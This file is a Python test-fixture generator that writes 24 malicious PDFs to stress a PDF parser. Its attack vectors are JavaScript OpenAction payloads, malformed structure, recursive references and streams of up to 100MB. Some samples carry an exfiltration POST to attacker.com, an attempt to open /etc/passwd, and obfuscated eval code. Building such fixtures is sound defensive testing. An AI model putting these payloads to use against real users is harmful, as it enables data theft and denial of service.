#!/usr/bin/env python3
"""
Generate malicious PDF samples for adversarial testing.

This script creates 24+ malicious PDF samples covering various attack vectors:
- Embedded JavaScript
- Malformed structure
- Recursive references
- Large embedded objects
- Mixed attack vectors
"""

from pathlib import Path
import json


def generate_javascript_pdfs():
    """Generate PDFs with embedded JavaScript."""
    samples = []
    
    # Sample 1: Basic JavaScript alert
    samples.append({
        "filename": "malicious_001_javascript.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.alert('XSS Test - Basic Alert');) >>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Malicious PDF) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000140 00000 n 
0000000197 00000 n 
0000000397 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
490
%%EOF
"""
    })
    
    # Sample 2: JavaScript with app.launchURL
    samples.append({
        "filename": "malicious_002_javascript.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.launchURL('http://malicious.example.com', true);) >>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000155 00000 n 
0000000212 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
280
%%EOF
"""
    })
    
    # Sample 3: JavaScript with file system access attempt
    samples.append({
        "filename": "malicious_003_javascript.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (var f = app.openDoc('/etc/passwd'); app.alert(f.path);) >>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000170 00000 n 
0000000227 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
295
%%EOF
"""
    })
    
    # Sample 4: JavaScript with network access
    samples.append({
        "filename": "malicious_004_javascript.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (Net.HTTP.request({cURL: 'http://attacker.com/exfiltrate', cVerb: 'POST', cData: 'sensitive_data'});) >>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000210 00000 n 
0000000267 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
335
%%EOF
"""
    })
    
    # Sample 5: Obfuscated JavaScript
    samples.append({
        "filename": "malicious_005_javascript.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (eval(String.fromCharCode(97,112,112,46,97,108,101,114,116,40,39,88,83,83,39,41));) >>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000200 00000 n 
0000000257 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
325
%%EOF
"""
    })
    
    return samples


def generate_malformed_pdfs():
    """Generate malformed PDF samples."""
    samples = []
    
    # Sample 6: Missing required objects
    samples.append({
        "filename": "malicious_006_malformed.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
>>
endobj
xref
0 2
0000000000 65535 f 
0000000009 00000 n 
trailer
<<
/Size 2
/Root 1 0 R
>>
startxref
50
%%EOF
"""
    })
    
    # Sample 7: Invalid xref table
    samples.append({
        "filename": "malicious_007_malformed.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
xref
0 3
INVALID XREF TABLE
trailer
<<
/Size 3
/Root 1 0 R
>>
startxref
150
%%EOF
"""
    })
    
    # Sample 8: Corrupted stream data
    samples.append({
        "filename": "malicious_008_malformed.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 100
>>
stream
CORRUPTED_STREAM_DATA_THAT_IS_NOT_VALID_PDF_CONTENT
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000215 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
365
%%EOF
"""
    })
    
    # Sample 9: Invalid PDF header
    samples.append({
        "filename": "malicious_009_malformed.pdf",
        "content": b"""INVALID-PDF-HEADER
1 0 obj
<<
/Type /Catalog
>>
endobj
xref
0 2
0000000000 65535 f 
0000000020 00000 n 
trailer
<<
/Size 2
/Root 1 0 R
>>
startxref
61
%%EOF
"""
    })
    
    # Sample 10: Truncated file
    samples.append({
        "filename": "malicious_010_malformed.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 1000
>>
stream
TRUNCATED_CONTENT_THAT_DOES_NOT_MATCH_LENGTH
"""
    })
    
    return samples


def generate_recursive_pdfs():
    """Generate PDFs with recursive references."""
    samples = []
    
    # Sample 11: Self-referencing catalog
    samples.append({
        "filename": "malicious_011_recursive.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 1 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000080 00000 n 
0000000137 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
205
%%EOF
"""
    })
    
    # Sample 12: Circular page tree
    samples.append({
        "filename": "malicious_012_recursive.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
/Parent 2 0 R
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000138 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
206
%%EOF
"""
    })
    
    # Sample 13: Deep recursion
    samples.append({
        "filename": "malicious_013_recursive.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Next 1 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Next 3 0 R
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000075 00000 n 
0000000132 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
215
%%EOF
"""
    })
    
    # Sample 14: Mutual object references
    samples.append({
        "filename": "malicious_014_recursive.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Ref 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Ref 1 0 R
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000072 00000 n 
0000000129 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
210
%%EOF
"""
    })
    
    # Sample 15: Indirect recursion
    samples.append({
        "filename": "malicious_015_recursive.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
/Ref 4 0 R
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
4 0 obj
<<
/Type /Dict
/Ref 2 0 R
>>
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000138 00000 n 
0000000206 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
255
%%EOF
"""
    })
    
    return samples


def generate_large_object_pdfs():
    """Generate PDFs with large embedded objects."""
    samples = []
    
    # Sample 16: 10MB embedded stream
    large_data_10mb = b"A" * (10 * 1024 * 1024)
    samples.append({
        "filename": "malicious_016_large_object.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length """ + str(len(large_data_10mb)).encode() + b"""
>>
stream
""" + large_data_10mb + b"""
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000215 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
""" + str(300 + len(large_data_10mb)).encode() + b"""
%%EOF
"""
    })
    
    # Sample 17: 100MB embedded image (simulated)
    large_data_100mb = b"B" * (100 * 1024 * 1024)
    samples.append({
        "filename": "malicious_017_large_object.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length """ + str(len(large_data_100mb)).encode() + b"""
>>
stream
""" + large_data_100mb + b"""
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000215 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
""" + str(300 + len(large_data_100mb)).encode() + b"""
%%EOF
"""
    })
    
    # Sample 18: 50MB compressed stream
    large_data_50mb = b"C" * (50 * 1024 * 1024)
    samples.append({
        "filename": "malicious_018_large_object.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length """ + str(len(large_data_50mb)).encode() + b"""
/Filter /FlateDecode
>>
stream
""" + large_data_50mb + b"""
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000215 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
""" + str(320 + len(large_data_50mb)).encode() + b"""
%%EOF
"""
    })
    
    # Sample 19: Multiple 5MB objects
    large_data_5mb = b"D" * (5 * 1024 * 1024)
    samples.append({
        "filename": "malicious_019_large_object.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents [4 0 R 5 0 R 6 0 R 7 0 R 8 0 R]
>>
endobj
4 0 obj
<<
/Length """ + str(len(large_data_5mb)).encode() + b"""
>>
stream
""" + large_data_5mb + b"""
endstream
endobj
5 0 obj
<<
/Length """ + str(len(large_data_5mb)).encode() + b"""
>>
stream
""" + large_data_5mb + b"""
endstream
endobj
6 0 obj
<<
/Length """ + str(len(large_data_5mb)).encode() + b"""
>>
stream
""" + large_data_5mb + b"""
endstream
endobj
7 0 obj
<<
/Length """ + str(len(large_data_5mb)).encode() + b"""
>>
stream
""" + large_data_5mb + b"""
endstream
endobj
8 0 obj
<<
/Length """ + str(len(large_data_5mb)).encode() + b"""
>>
stream
""" + large_data_5mb + b"""
endstream
endobj
xref
0 9
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000235 00000 n 
""" + str(300 + len(large_data_5mb)).encode() + b""" 00000 n 
""" + str(400 + 2*len(large_data_5mb)).encode() + b""" 00000 n 
""" + str(500 + 3*len(large_data_5mb)).encode() + b""" 00000 n 
""" + str(600 + 4*len(large_data_5mb)).encode() + b""" 00000 n 
trailer
<<
/Size 9
/Root 1 0 R
>>
startxref
""" + str(700 + 5*len(large_data_5mb)).encode() + b"""
%%EOF
"""
    })
    
    # Sample 20: 20MB font data
    large_data_20mb = b"E" * (20 * 1024 * 1024)
    samples.append({
        "filename": "malicious_020_large_object.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /CustomFont
/FontDescriptor 5 0 R
>>
endobj
5 0 obj
<<
/Type /FontDescriptor
/FontName /CustomFont
/FontFile 6 0 R
>>
endobj
6 0 obj
<<
/Length """ + str(len(large_data_20mb)).encode() + b"""
>>
stream
""" + large_data_20mb + b"""
endstream
endobj
xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000235 00000 n 
0000000335 00000 n 
0000000425 00000 n 
trailer
<<
/Size 7
/Root 1 0 R
>>
startxref
""" + str(500 + len(large_data_20mb)).encode() + b"""
%%EOF
"""
    })
    
    return samples


def generate_mixed_attack_pdfs():
    """Generate PDFs with mixed attack vectors."""
    samples = []
    
    # Sample 21: JavaScript + Recursion
    samples.append({
        "filename": "malicious_021_mixed.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.alert('Mixed Attack');) >>
/Metadata 1 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
/Parent 2 0 R
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000155 00000 n 
0000000235 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
303
%%EOF
"""
    })
    
    # Sample 22: Malformed + Large Object
    large_data = b"F" * (10 * 1024 * 1024)
    samples.append({
        "filename": "malicious_022_mixed.pdf",
        "content": b"""INVALID-HEADER
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length """ + str(len(large_data)).encode() + b"""
>>
stream
""" + large_data + b"""
endstream
endobj
xref
INVALID XREF
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
""" + str(300 + len(large_data)).encode() + b"""
%%EOF
"""
    })
    
    # Sample 23: JavaScript + Large Object
    large_data_js = b"G" * (10 * 1024 * 1024)
    samples.append({
        "filename": "malicious_023_mixed.pdf",
        "content": b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.alert('Large Object Attack');) >>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length """ + str(len(large_data_js)).encode() + b"""
>>
stream
""" + large_data_js + b"""
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000155 00000 n 
0000000212 00000 n 
0000000312 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
""" + str(400 + len(large_data_js)).encode() + b"""
%%EOF
"""
    })
    
    # Sample 24: All attack vectors combined
    large_data_all = b"H" * (10 * 1024 * 1024)
    samples.append({
        "filename": "malicious_024_mixed.pdf",
        "content": b"""INVALID-PDF-HEADER
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (eval(String.fromCharCode(97,112,112,46,97,108,101,114,116,40,39,65,108,108,32,65,116,116,97,99,107,115,39,41));) >>
/Metadata 1 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
/Parent 2 0 R
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Ref 3 0 R
>>
endobj
4 0 obj
<<
/Length """ + str(len(large_data_all)).encode() + b"""
>>
stream
""" + large_data_all + b"""
endstream
endobj
xref
CORRUPTED XREF TABLE
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
""" + str(500 + len(large_data_all)).encode() + b"""
%%EOF
"""
    })
    
    return samples


def main():
    """Generate all malicious PDF samples."""
    output_dir = Path(__file__).parent
    output_dir.mkdir(parents=True, exist_ok=True)
    
    print("Generating malicious PDF samples...")
    
    # Generate all sample types
    all_samples = []
    all_samples.extend(generate_javascript_pdfs())
    all_samples.extend(generate_malformed_pdfs())
    all_samples.extend(generate_recursive_pdfs())
    all_samples.extend(generate_large_object_pdfs())
    all_samples.extend(generate_mixed_attack_pdfs())
    
    # Write samples to files
    for sample in all_samples:
        filepath = output_dir / sample["filename"]
        filepath.write_bytes(sample["content"])
        print(f"  Created: {sample['filename']}")
    
    print(f"\nGenerated {len(all_samples)} malicious PDF samples")
    print(f"Output directory: {output_dir}")
    
    # Create metadata file
    metadata = {
        "total_samples": len(all_samples),
        "attack_types": {
            "javascript": 5,
            "malformed": 5,
            "recursive": 5,
            "large_object": 5,
            "mixed": 4
        },
        "samples": [s["filename"] for s in all_samples]
    }
    
    metadata_file = output_dir / "samples_metadata.json"
    metadata_file.write_text(json.dumps(metadata, indent=2))
    print(f"\nMetadata saved to: {metadata_file}")


if __name__ == "__main__":
    main()
